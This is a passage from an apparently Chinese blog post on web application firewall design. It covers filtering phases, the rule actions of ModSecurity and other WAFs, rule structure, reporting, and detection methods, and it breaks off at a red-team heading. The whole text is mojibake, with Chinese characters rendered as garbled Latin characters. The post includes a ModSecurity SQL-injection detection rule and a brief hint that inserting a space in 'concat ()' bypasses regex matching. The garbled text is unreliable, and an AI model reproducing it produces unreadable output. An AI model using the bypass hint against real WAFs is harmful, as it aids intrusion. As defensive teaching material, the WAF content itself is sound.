ï¼Œæ‰èƒ½å¤ŸçŸ¥é“å®ƒçœŸå®çš„payloadã€‚æ‰€ä»¥éœ€è¦å¯¹httpè¯·æ±‚è¿›è¡Œè§£ç ã€‚</li><li>httpè¯·æ±‚å¤´éƒ¨è¿‡è§„åˆ™ï¼šGETï¼ŒHEADæ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ç´§è·ŸURLï¼Œè¿™ä¸ªé˜¶æ®µå°±å¯ä»¥è¿›è¡Œè¿‡æ»¤ï¼Œè€Œä¸”å…ˆå¯¹è¯·æ±‚å¤´éƒ¨è¿‡æ»¤ï¼Œä¹Ÿæ˜¯åŸºäºæ€§èƒ½è€ƒè™‘ã€‚æ¯•ç«Ÿè¯·æ±‚urlå‚æ•°å’Œå¤´éƒ¨éƒ½æ˜¯key-valueæ–¹å¼ï¼Œè§£æç›¸å¯¹æ¯”å†…å®¹è¦å¿«ã€‚</li><li>httpè¯·æ±‚å†…å®¹è¿‡è§„åˆ™ï¼šPOSTæ–¹æ³•çš„å‚æ•°åŸºæœ¬éƒ½æ˜¯æ”¾åœ¨è¯·æ±‚å†…å®¹é‡Œã€‚</li></ul></li></ul></li><li>å“åº”éƒ¨åˆ†<ul><li>å“åº”å¤´éƒ¨è¿‡è§„åˆ™ï¼šå“åº”å¤´éƒ¨æœ‰ä¸å°‘å­—æ®µä¼šæ³„éœ²èƒŒåæœåŠ¡çš„å…³é”®ä¿¡æ¯ï¼Œå¦‚serverä¼šæ³„éœ²webserverè½¯ä»¶åŠç‰ˆæœ¬ï¼Œx-powered-byä¼šæ³„éœ²cgiè¯­è¨€å’Œç‰ˆæœ¬ï¼ˆPHPï¼ŒPython,Perl,Rubyä¹‹ç±»ï¼‰ï¼ŒViaå’ŒMax-Forwardä¼šæ³„éœ²WebServerçš„æ‹“æ‰‘ã€‚ä¸ºäº†é¿å…æ”»å‡»è€…åˆ©ç”¨è¿™äº›ä¿¡æ¯æ”»å‡»ï¼Œéœ€è¦å¯¹å“åº”å¤´éƒ¨æŸäº›å­—æ®µè¿›è¡Œå±è”½æˆ–ä¼ªè£…ã€‚</li><li>å“åº”å†…å®¹è¿‡è§„åˆ™ï¼šè¿™ä¸€éƒ¨åˆ†ä¹Ÿå«åšè½¯è¡¥ä¸åŠŸèƒ½ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå¦‚æœwebserverçš„åº”ç”¨æœåŠ¡æŠ›å¼‚å¸¸äº†ï¼Œå¹¶æŠŠå¼‚å¸¸ä¿¡æ¯æ˜¾ç¤ºåœ¨é¡µé¢ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„ä¿¡æ¯æ³„éœ²ã€‚å¦‚æœéœ€è¦ç ”å‘å›¢é˜Ÿæ¥ä¿®æ”¹å’Œæµ‹è¯•ï¼Œè¿ç»´å›¢é˜Ÿå¯¹è¯¥æœåŠ¡è¿›è¡Œæ‰“è¡¥ä¸ä¸Šçº¿ï¼Œæ•´ä¸ªè¿‡ç¨‹å¯èƒ½æŒç»­å‡ å‘¨ï¼Œå­˜åœ¨å¾ˆå¤§çš„é£é™©çª—å£ã€‚å¦‚æœåœ¨WAFä¸Šï¼Œå¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œä¼ªè£…æˆ–å±è”½ï¼Œå°±å¯ä»¥æå¤§é™ä½å®‰å…¨é£é™©ã€‚æ›´åŠ ä¸ç”¨é‚£äº›ä¼šæ³„éœ²ç”¨æˆ·ä¿¡æ¯ï¼Œé‡‘èä¿¡æ¯ç­‰æœåŠ¡ã€‚</li></ul></li></ol><h3 id="WAFåŠ¨ä½œ"><a href="#WAFåŠ¨ä½œ" class="headerlink" title="WAFåŠ¨ä½œ"></a>WAFåŠ¨ä½œ</h3><p>WAFæ¯æ¡è§„åˆ™éƒ½ä¼šé…ç½®åŠ¨ä½œï¼Œå¯¹å‘½ä¸­è§„åˆ™çš„è¯·æ±‚è¿›è¡Œå¯¹åº”çš„å¤„ç†ã€‚æ¯ä¸ªWAFäº§å“å¯¹åŠ¨ä½œå®šä¹‰ä¸å¤§ä¸€æ ·ã€‚</p><ol><li>ModSecurityå®šä¹‰äº†allow, block, deny, drop, pass, pause, proxy, redirect<ul><li>allow: å‘½ä¸­äº†æŸæ¡è§„åˆ™åï¼Œä¸éœ€è¦å¯¹è¯·æ±‚&#x2F;å“åº”åº”ç”¨å…¶å®ƒè§„åˆ™ï¼Œç›´æ¥è®©è¯·æ±‚é€šè¿‡ã€‚è¿™ä¸ªå¯ä»¥ç”¨äºç™½åå•ã€‚</li><li>block: å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„åŠ¨ä½œï¼Œå®ƒçš„è¡Œä¸ºå–å†³äºé…ç½®çš„é»˜è®¤åŠ¨ä½œï¼Œå¦‚æœé»˜è®¤åŠ¨ä½œæ›´æ–°ï¼Œä½¿ç”¨blockçš„è§„åˆ™è¡Œä¸ºä¹Ÿéšå³æ”¹å˜ã€‚åœ¨å®‰å…¨å“åº”æ–¹é¢ï¼Œå®ƒå¯ç”¨äºæ‰¹é‡è¿›è¡Œè§„åˆ™ä½œä¸ºæ›´æ–°ã€‚</li><li>deny: ä¸­æ–­è§„åˆ™å¤„ç†ï¼Œæ‹¦æˆªè¯·æ±‚&#x2F;å“åº”ã€‚åœ¨å®¢æˆ·ç«¯çš„è§’åº¦æ¥è¯´ï¼Œè¿™ä¸ªåŠ¨ä½œä¼šè¿”å›4xxæˆ–5xxçš„çŠ¶æ€ç ï¼ˆå–å†³äºè§„åˆ™å®šä¹‰status)ï¼Œä½†å¹¶æ²¡æœ‰ä¸­æ–­å½“å‰çš„è¿æ¥</li><li>drop: å¯¹å½“å‰tcpè¿æ¥è¿›è¡Œå…³é—­æ“ä½œï¼Œå®ƒå’Œdenyçš„ä¸åŒæ˜¯ï¼šdenyä¹‹åï¼Œå®¢æˆ·ç«¯ä»ç„¶å¯ä»¥æäº¤è¯·æ±‚ï¼Œä½†ä½¿ç”¨dropåï¼Œå®¢æˆ·ç«¯åªæœ‰é‡æ–°è¿æ¥æ‰å¯ä»¥è®¿é—®ã€‚è¿™ä¸ªåŠ¨ä½œå¯ä»¥èŠ‚çœåç«¯æœåŠ¡çš„è¿æ¥æ•°</li><li>pass: å‘½ä¸­æŸæ¡è§„åˆ™ç»§ç»­åŒ¹é…ä¸‹ä¸€æ¡è§„åˆ™ã€‚å¯ç”¨äºå¯¹è¯·æ±‚è¿›è¡Œç²¾ç»†åœ°è¿‡æ»¤ï¼Œä½†ä¼šå¯¹å“åº”é€Ÿåº¦æœ‰è¾ƒå¤§å½±å“ã€‚</li><li>pause: å‘½ä¸­æŸæ¡è§„åˆ™ï¼Œå¯¹å½“å‰äº‹åŠ¡æš‚åœæŒ‡å®šçš„æ¯«ç§’ã€‚ä¸€èˆ¬ç”¨äºé˜²æ­¢ç™»å½•çˆ†ç ´ã€‚å¦‚æœé­å—DDOSæ”»å‡»ï¼Œä¼šæ¶åŒ–æ•´ä¸ªwebæœåŠ¡çš„å“åº”é€Ÿåº¦</li><li>proxy: æŠŠå‘½ä¸­è§„åˆ™çš„è¯·æ±‚è½¬å‘åˆ°å¦å¤–ä¸€ä¸ªwebæœåŠ¡å»ã€‚è¿™ä¸ªåŠŸèƒ½ç±»ä¼¼åå‘ä»£ç†ã€‚ç”±äºå®ƒå¯¹å®¢æˆ·ç«¯å®Œå…¨æ¥è¯´ï¼Œå®Œå…¨æ˜¯æ— æ„ŸçŸ¥ï¼Œå¯ä»¥ç”¨å®ƒå¯¼å‘è¯·æ±‚åˆ°èœœç½ç³»ç»Ÿã€‚è¿™ä¸ªåŠ¨ä½œæ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„åŠ¨ä½œã€‚</li><li>redirect: å½“è§„åˆ™è¢«å‘½ä¸­ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªé‡å®šå‘ï¼ŒæŒ‡ç¤ºæµè§ˆå™¨è®¿é—®å¦å¤–ä¸€ä¸ªurlã€‚å®ƒå’Œproxyçš„åŒºåˆ«æ˜¯ï¼Œå®ƒå¯¹å®¢æˆ·ç«¯æ˜¯æ„ŸçŸ¥ã€‚å¯ç”¨äºé…ç½®æ–°ä¸Šçº¿æ¥å£æˆ–å±è”½æŸäº›æœ‰é—®é¢˜çš„æ¥å£ã€‚</li></ul></li><li>Naxsiå®šä¹‰äº†accept, block, drop<ul><li>accept: å¯¹åº”ModSecurityçš„allowï¼Œ ä¸€æ—¦å‘½ä¸­ç«‹é©¬æ”¾è¡Œ</li><li>block: å¯¹åº”ModSecurityçš„deny</li><li>drop: å¯¹åº”ModSecurityçš„drop</li></ul></li><li>åä¸ºäº‘WAFå®šä¹‰äº†allow, deny, redirect<ul><li>accept: å¯¹åº”ModSecurityçš„allowï¼Œ ä¸€æ—¦å‘½ä¸­ç«‹é©¬æ”¾è¡Œ</li><li>deny: å¯¹åº”ModSecurityçš„deny, é»˜è®¤è¿”å›418</li><li>redirect: å¯¹åº”Modsecurityçš„redirect</li></ul></li><li>openrestyl lua WAFå®šä¹‰äº†allow, denyï¼Œdropï¼Œ redirect<ul><li>accept: å¯¹åº”ModSecurityçš„allowï¼Œ ä¸€æ—¦å‘½ä¸­ç«‹é©¬æ”¾è¡Œ</li><li>deny: å¯¹åº”ModSecurityçš„denyï¼Œ é»˜è®¤è¿”å›403</li><li>drop: å¯¹åº”ModSecurityçš„drop</li><li>redirect: å¯¹åº”Modsecurityçš„redirect</li></ul></li></ol><p>å¯¹äºåŠ¨ä½œé…ç½®æ–¹é¢ï¼Œæœ‰è¿™æ ·çš„å»ºè®®ï¼š<br>åœ¨åŠŸèƒ½å¼€å‘æ–¹é¢ï¼Œdropæœ€å¥½èƒ½å¤Ÿå…ˆè¿”å›ä¸€ä¸ªçŠ¶æ€ç å†åœæ­¢æ‰æ•´ä¸ªè¿æ¥ï¼Œdrop, denyçŠ¶æ€ç å°½é‡å¯ä»¥é€šè¿‡è§„åˆ™é…ç½®ã€‚<br>åœ¨é…ç½®è§„åˆ™æ—¶ï¼Œå¯¹äºdrop, denyçš„çŠ¶æ€ç ï¼Œæ¯æ¡è§„åˆ™æˆ–è§„åˆ™ç»„éƒ½è¿”å›ä¸åŒçš„çŠ¶æ€ç ã€‚<br>è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼š</p><p>æœ‰æ•ˆéšè—WAFçš„ç‰¹å¾ï¼Œè®©æ”»å‡»è€…æ— æ³•ç¡®è®¤æ˜¯å¦æœ‰WAFå­˜åœ¨<br>å½“å‡ºç°è§„åˆ™è¯¯æ‹¦æˆªæ—¶ï¼Œå¯ä»¥æ ¹æ®è¿”å›ç å¿«é€Ÿå®šä½æ˜¯å“ªæ¡è§„åˆ™è¯¯æ‹¦æˆªã€‚è¿™æ˜¯ä»æ— æ•°æ¬¡èƒŒé”…æ„Ÿæ‚Ÿå‡ºæ¥çš„è¡€çš„æ•™è®­</p><h3 id="WAFè§„åˆ™ä¸æŠ¥è¡¨"><a href="#WAFè§„åˆ™ä¸æŠ¥è¡¨" class="headerlink" title="WAFè§„åˆ™ä¸æŠ¥è¡¨"></a>WAFè§„åˆ™ä¸æŠ¥è¡¨</h3><p>æœ¬ä¸Šï¼ŒWAFå¤„ç†httpåˆ†ä¸ºå››ä¸ªé˜¶æ®µï¼šè¯·æ±‚å¤´éƒ¨ï¼Œè¯·æ±‚å†…å®¹ï¼Œå“åº”å¤´éƒ¨ï¼Œå“åº”å†…å®¹ã€‚é‚£ä¹ˆWAFè§„åˆ™å°±æ˜¯ï¼Œå®šä¹‰åœ¨æŸä¸ªé˜¶æ®µWAFå¯¹ç¬¦åˆæŸç§æ¡ä»¶çš„httpè¯·æ±‚æ‰§è¡ŒæŒ‡å®šåŠ¨ä½œçš„æ¡ä¾‹ã€‚æ ¹æ®è¿™ä¸ªï¼ŒWAFè§„åˆ™å¿…é¡»è¦åŒ…å«è¿™äº›å…ƒç´ ï¼šè¿‡æ»¤æ¡ä»¶ï¼Œé˜¶æ®µï¼ŒåŠ¨ä½œã€‚ç”±äºhttpæ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¼šå¯¹æ•°æ®è¿›è¡ŒæŸç§ç¼–ç ï¼Œæ‰€ä»¥ï¼ŒWAFè§„åˆ™å¾€å¾€ä¹Ÿéœ€è¦å®šä¹‰è§£ç å™¨ã€‚åŒæ—¶ä¸ºäº†å®¡è®¡ä½œç”¨ï¼ŒWAFè§„åˆ™å¾€å¾€å®šä¹‰idï¼Œæ˜¯å¦å¯¹ç»“æœè®°å½•ï¼Œä»¥åŠå­—æ®µæŠ½å–ï¼Œå‘½ä¸­è§„åˆ™çš„ä¸¥é‡çº§åˆ«æ‰€ä»¥ï¼Œä¸€æ¡WAFè§„åˆ™å¾€å¾€åŒ…å«ï¼šid, è§£ç å™¨ï¼Œè¿‡æ»¤æ¡ä»¶ï¼Œé˜¶æ®µï¼ŒåŠ¨ä½œå’Œæ—¥å¿—æ ¼å¼ï¼Œä¸¥é‡çº§åˆ«ã€‚</p><p>ä»¥ä¸€æ¡ModSecurityè§„åˆ™ä¸ºä¾‹ï¼š</p><blockquote><p>SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:&#x2F;* â€œ\bsys.user_catalog\bâ€ \ â€œphase:2,rev:â€™2.1.3â€™,capture,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:replaceComments,t:compressWhiteSpace,ctl:auditLogParts&#x3D;+E, \ block,msg:â€™Blind SQL Injection Attackâ€™,id:â€™959517â€™,tag:â€™WEB_ATTACK&#x2F;SQL_INJECTIONâ€™,tag:â€™WASCTC&#x2F;WASC-19â€™,tag:â€™OWASP_TOP_10&#x2F;A1â€™,tag:â€™OWASP_AppSensor&#x2F;CIE1â€™, \ tag:â€™PCI&#x2F;6.5.2â€™,logdata:â€™%{TX.0}â€™,severity:â€™2â€™,setvar:â€™tx.msg&#x3D;%{rule.msg}â€™,setvar:tx.sql_injection_score&#x3D;+%{tx.critical_anomaly_score}, \ setvar:tx.anomaly_score&#x3D;+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK&#x2F;SQL_INJECTION-%{matched_var_name}&#x3D;%{tx.0}â€<br>çœ‹èµ·æ¥éå¸¸ææ€–ã€‚ç¿»è¯‘æˆXMLå°±æ¸…æ™°å¤šäº†</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">rule</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>959517<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">severity</span>&gt;</span>2<span class="tag">&lt;/<span class="name">severity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>2<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">decoder</span>&gt;</span>none, urlDecodeUni,htmlEntityDecode,lowercase,replaceComments,compressWhiteSpace<span class="tag">&lt;/<span class="name">decoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">condition</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span>&gt;</span>REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/*<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operator</span>&gt;</span>regex<span class="tag">&lt;/<span class="name">operator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>\bsys\.user_catalog\b<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">condition</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span>&gt;</span>block<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tags</span>&gt;</span><span class="tag">&lt;/<span class="name">tags</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">log</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">format</span>&gt;</span><span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">varibles</span>&gt;</span><span class="tag">&lt;/<span class="name">varibles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">log</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è§„åˆ™é™·é˜±ï¼šè§„åˆ™ä¹‹é—´çš„å…³ç³»éå¸¸å¤æ‚ï¼Œç‰¹åˆ«è¿‡æ»¤æ¡ä»¶æ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå¾€å¾€æ˜¯ä¼šæœ‰åŒ…å«å…³ç³»ï¼Œå¦‚[0-9]+åŒ…å«äº†[1-2]+ã€‚é‚£ä¹ˆï¼Œå‡è®¾è§„åˆ™aå…ˆåŠ å…¥WAFï¼Œåé¢åˆæ–°å¢äº†æ¡è§„åˆ™bï¼Œåœ¨è¯­æ³•ä¸Šï¼Œbçš„è¿‡æ»¤æ¡ä»¶åŒ…å«äº†aï¼Œè€Œä¸”åœ¨é…ç½®ä¸Šï¼Œä¸å°å¿ƒæ”¾åœ¨aå‰é¢ï¼Œé‚£ä¹ˆï¼Œå°±ä¼šå‡ºç°è¯¯åˆ¤çš„æƒ…å†µã€‚<br>è¯¯åˆ¤å’Œæ¼åˆ¤ï¼Œæ˜¯å¾ˆå¸¸è§çš„é—®é¢˜ã€‚ä½†åœ¨ä¸¥é‡ç¨‹åº¦ä¸Šï¼Œå´æ˜¯ä¸ä¸€æ ·ã€‚</p><ul><li>æ¼åˆ¤ï¼Œå¯èƒ½ä¼šé€ æˆæ¶æ„è¯·æ±‚ç»•è¿‡WAFï¼Œè·‘åˆ°ä¸šåŠ¡åå°ï¼Œä½†åœ¨ä¸šåŠ¡åå°åŠ ä¸Šå…¶å®ƒå®‰å…¨æªæ–½ï¼Œå´å¯ä»¥ç¼“è§£å¨èƒã€‚</li><li>è¯¯åˆ¤ï¼Œåˆ™æ˜¯ç›´æ¥åœ¨WAFæŠŠæ­£å¸¸è¯·æ±‚ç»™æ‹¦æˆªæ‰ï¼Œå½±å“æ­£å¸¸çš„ä¸šåŠ¡ã€‚æ›¾ç»æŸå¤§å‚é‡è¦ä¸šåŠ¡éƒ¨é—¨ä¸ŠWAFï¼Œç”±äºè¯¯åˆ¤ï¼Œå¯¼è‡´æ­£å¸¸äº¤æ˜“åªæœ‰50%æˆåŠŸï¼Œå‡ ä¸Šå‡ ä¸‹ä¹‹åï¼ŒWAFå›¢é˜Ÿçš„äººåŸºæœ¬å¹²æ‰äº†ã€‚</li></ul><p>æ‰€ä»¥ï¼Œåœ¨æµ‹è¯•ç¯å¢ƒï¼Œ<strong>WAFè§„åˆ™è¦è¶Šä¸¥æ ¼è¶Šå¥½</strong>ã€‚ä½†åœ¨ç”Ÿäº§ç¯å¢ƒï¼Œå¯¹æœ‰æŠŠæ¡çš„è§„åˆ™æ‰ç»´æŒåŸæ ·ï¼Œå…¶å®ƒè§„åˆ™å°½é‡æ”¾å®½æ¾ä¸€äº›ã€‚<br>è™½ç„¶WAFè§„åˆ™å¯ä»¥è®¾ç½®ä¸€ä¸ªidç”¨äºè¿½æº¯ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œå› ä¸ºæ— æ³•è¿½æº¯æ˜¯ç”±å“ªä¸ªæ¶ˆæ¯è§¦å‘ï¼Œè§„åˆ™å¯¹æ¶ˆæ¯å¤„ç†çš„é¡ºåºæ˜¯æ€æ ·ã€‚æ‰€ä»¥ï¼Œä¸€ä¸ªç¨³å¦¥çš„è§„åˆ™å¼•æ“ï¼Œåº”å½“åœ¨httpæ¶ˆæ¯æ¥æ”¶æ—¶ï¼Œåœ¨å¤´éƒ¨å¢åŠ ä¸€ä¸ªæ¶ˆæ¯idï¼Œå½“æ¶ˆæ¯ç¦»å¼€WAFå‰ï¼Œåˆ é™¤æ‰è¿™ä¸ªæ¶ˆæ¯idã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥å¾ˆå¥½è¿½æº¯åˆ°æ¯æ¡æ¶ˆæ¯ä¼šè§¦å‘å“ªäº›è§„åˆ™ï¼Œè§¦å‘ç»“æœæ˜¯æ€æ ·ã€‚å½“å‡ºç°è¯¯åˆ¤æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥ç«‹é©¬çŸ¥é“æ˜¯å“ªäº›è§„åˆ™æœ‰é—®é¢˜ï¼Œé¡ºåºæ˜¯æ€æ ·ï¼Œè§„åˆ™å®šä¹‰æ˜¯å¦åˆç†ã€‚</p><p>æŠ¥è¡¨ï¼š<br>WAFæŠ¥è¡¨é™¤äº†æ˜¯å±•ç¤ºç»™ç”¨æˆ·çœ‹ï¼Œè¿˜å¯ä»¥ç”¨äºä¼˜åŒ–è§„åˆ™ã€‚å¦‚ä¸‹é¢åœºæ™¯ï¼š</p><ul><li>æŸäº›è§„åˆ™ä¸€ç›´æ²¡æœ‰å‘½ä¸­ï¼Œé…ç½®èµ·æ¥åªä¼šæµªè´¹è®¡ç®—èµ„æºï¼Œå½±å“ç”¨æˆ·ä½“ç°ã€‚</li><li>æŸäº›è§„åˆ™è™½ç„¶æœ‰å‘½ä¸­ï¼Œä½†å‘½ä¸­ç‡è¾ƒä½ï¼Œåº”è¯¥æ˜¯æ”¾ç½®åœ¨åé¢ï¼Œè€Œå‘½ä¸­ç‡é«˜çš„åˆ™åº”è¯¥è°ƒæ•´åœ¨å‰é¢ã€‚</li><li>æŸäº›URLè®¿é—®é¢‘ç‡è¾ƒé«˜ï¼Œä¸”å¹¶éæ ‡å‡†æµè§ˆå™¨è®¿é—®ï¼Œéœ€è¦è¿›ä¸€æ­¥è§‚å¯Ÿå’Œåˆ†æï¼Œçœ‹æ˜¯å¦ä¼šæœ‰æ¼åˆ¤é£é™©</li></ul><p>é‚£ä¹ˆï¼ŒæŠ¥è¡¨åº”è¯¥ä»å“ªäº›ç»´åº¦æ¥å±•ç¤ºå‘¢ï¼Ÿå…ˆä»è¯­ä¹‰æ¥æè¿°ä¸€ä¸‹httpæ¶ˆæ¯æµç»wafçš„è¿‡ç¨‹ï¼š</p><ul><li>å®¢æˆ·ç«¯Aåœ¨ç‰©ç†åœ°ç‚¹Bï¼Œä½¿ç”¨IPåœ°å€Cè®¿é—®ç«™ç‚¹Dï¼Œå‘URLåœ°å€Eå‘èµ·æ–¹æ³•ä¸ºFçš„HTTPè¯·æ±‚Gï¼Œå‘½ä¸­äº†è§£ç å™¨ä¸ºHï¼Œç±»å‹ä¸ºIï¼Œé£é™©çº§åˆ«ä¸ºJï¼Œæ‰§è¡ŒåŠ¨ä½œä¸ºKçš„è§„åˆ™Lã€‚</li><li>ç«™ç‚¹Må‘IPåœ°å€Nè¿”å›å“åº”Oï¼Œå‘½ä¸­äº†è§£ç å™¨ä¸ºPï¼Œç±»å‹ä¸ºQï¼Œé£é™©çº§åˆ«ä¸ºRï¼Œæ‰§è¡ŒåŠ¨ä½œä¸ºSçš„è§„åˆ™Tã€‚</li></ul><p>ç”±è¯­ä¹‰æ¥çœ‹ï¼Œå»é‡ä¹‹åï¼ŒæŠ¥è¡¨çš„ç»´åº¦è‡³å°‘è¦åŒ…å«ï¼š</p><ul><li>å®¢æˆ·ç«¯ï¼ˆuser_agent)åˆ†å¸ƒ</li><li>IPåœ°å€ï¼Œç”šè‡³æ˜¯IPæ®µåˆ†å¸ƒ</li><li>ç‰©ç†åœ°ç‚¹åˆ†å¸ƒ</li><li>ç«™ç‚¹åˆ†å¸ƒåˆ†å¸ƒ</li><li>URLåˆ†å¸ƒ</li><li>HTTPæ–¹æ³•åˆ†å¸ƒ</li><li>è¯·æ±‚åˆ†å¸ƒï¼ˆè¿™ä¸ªä¼šæ¯”è¾ƒå›°éš¾ï¼ŒåŸºäºé•¿åº¦æ¥çœ‹ä¼šæ¯”è¾ƒå¥½ï¼‰</li><li>è§£ç å™¨åˆ†å¸ƒ</li><li>è§„åˆ™ç±»å‹åˆ†å¸ƒï¼ˆä¸€èˆ¬æ˜¯æŒ‡é’ˆå¯¹çš„æ”»å‡»ç±»å‹ï¼‰</li><li>é£é™©çº§åˆ«åˆ†å¸ƒ</li><li>åŠ¨ä½œåˆ†å¸ƒ</li><li>è§„åˆ™IDåˆ†å¸ƒ</li><li>å“åº”åˆ†å¸ƒï¼ˆå’Œè¯·æ±‚åˆ†å¸ƒä¸€æ ·å›°éš¾ï¼‰</li><li>æ—¶é—´åˆ†å¸ƒï¼ˆä»»ä½•äº‹ä»¶åªèƒ½åœ¨æ—¶é—´ä¸­è¿›è¡Œï¼‰</li><li>æ€»è¯·æ±‚æ•°</li><li>æ‹¦æˆªæ•°é‡</li></ul><h3 id="WAFæ£€æµ‹åŸç†"><a href="#WAFæ£€æµ‹åŸç†" class="headerlink" title="WAFæ£€æµ‹åŸç†"></a>WAFæ£€æµ‹åŸç†</h3><ol><li>åŸºäºè§„åˆ™åŒ¹é…ï¼šä¸€èˆ¬éƒ½æ˜¯åŸºäºä¸€å®šçš„æ­£åˆ™è¯­æ³•è¿›è¡ŒåŒ¹é…ï¼Œä¾‹å¦‚åŒ¹é…å‡½æ•° concat()ï¼Œè€Œä¸ä¼šåŒ¹é…å­—ç¬¦ concatã€‚è€Œ MySQLé‡Œé¢concatå‡½æ•°è°ƒç”¨çš„æ—¶å€™æ‹¬å·æ˜¯å¯ä»¥è¢«éš”å¼€çš„ã€‚ä¾‹å¦‚concat ()ï¼Œå°±å¯ä»¥ç»•è¿‡è¯¥æ­£åˆ™ã€‚</li><li>åŸºäºè¯­ä¹‰åˆ†æï¼šå°†è¾“å…¥çš„å‚æ•°æ¨¡æ‹Ÿä¸ºçœŸå®è¯­å¥å»è¿è¡Œï¼Œç„¶ååˆ¤æ–­ç»“æœæ˜¯å¦æœ‰é—®é¢˜ã€‚è¿™ç§ç†å¿µç±»ä¼¼äºä¸€ä¸ª webshellæ£€æµ‹å¼•æ“ï¼Œåœ¨ä¸è€ƒè™‘æ€§èƒ½ç­‰æƒ…å†µä¸‹ï¼Œå°†PHPçš„Zendå¼•æ“ä¸‹æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°hookä½ï¼Œå¦‚æœè¯¥å‡½æ•°è¢«è°ƒç”¨ï¼Œä¼šå…ˆè¿›å…¥è‡ªå·±çš„é€»è¾‘å»åˆ¤æ–­ã€‚å¦‚æœç¬¦åˆæ¶æ„æ‰§è¡Œçš„é€»è¾‘åˆ™åˆ¤æ–­ä¸ºwebshellæ‰§è¡Œï¼Œä»è€Œå®ç°webshellçš„è¯†åˆ«ã€‚å¯¹äºè¯­ä¹‰åˆ†æçš„WAFï¼Œç»•è¿‡ç†å¿µä¼šæ›´åŠ å¤æ‚å’Œå›°éš¾ã€‚å› ä¸ºä½ ä¸å†æ˜¯å¯¹æ­£åˆ™è¿›è¡Œç»•è¿‡ã€‚è€Œæ˜¯ç±»ä¼¼äºå¯¹ä¸€ä¸ªè§£æå¼•æ“è¿›è¡Œé»‘ç›’æµ‹è¯•çš„ç»•è¿‡ï¼Œå°†å…¶ç»•è¿‡åè¿˜è¦ä¿è¯åç«¯çš„çœŸå®è§£æå¼•æ“ä¸å‡ºé”™ã€‚ç±»ä¼¼äºå‰é¢ä¸¾ä¾‹ concatçš„ç»•è¿‡ï¼Œæœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº†å‰ç«¯è¯­è¨€å¼•æ“çš„è§£æå’Œåç«¯MySQLå¼•æ“è§£æçš„ä¸ä¸€è‡´è¾¾æˆç»•è¿‡ã€‚è€Œåœ¨åŸºäºè¯­ä¹‰åˆ†æç»•è¿‡çš„æƒ…å†µä¸‹ï¼Œå†ä¹Ÿæ— æ³•ä½¿ç”¨ç­‰ä»·æ›¿æ¢çš„æ‰‹æ®µï¼Œåªèƒ½é€šè¿‡WAFå¼•æ“ä¸åç«¯æœåŠ¡å™¨å¼•æ“ä¸ä¸€è‡´æ¥ç»•è¿‡ã€‚</li><li>RASPæŠ€æœ¯ï¼šä¾‹å¦‚OPENRASPæœ‰ä¸ªåŠŸèƒ½æ˜¯æ‹¦æˆªæ‰€æœ‰ php&#x2F;jsp ç­‰è„šæœ¬æ–‡ä»¶çš„å†™å…¥æ“ä½œï¼Œä»æ”»å‡»ä¼šäº§ç”Ÿçš„è¡Œä¸ºå»è¿›è¡Œæ£€æµ‹å’Œé˜²å¾¡ï¼Œ<a href="http://blog.nsfocus.net/rasp-tech/">http://blog.nsfocus.net/rasp-tech/</a></li></ol><h2 id="æ”»å‡»ï¼ˆçº¢å¯¹ï¼‰è§†è§’ä¸‹çš„WAF"><a 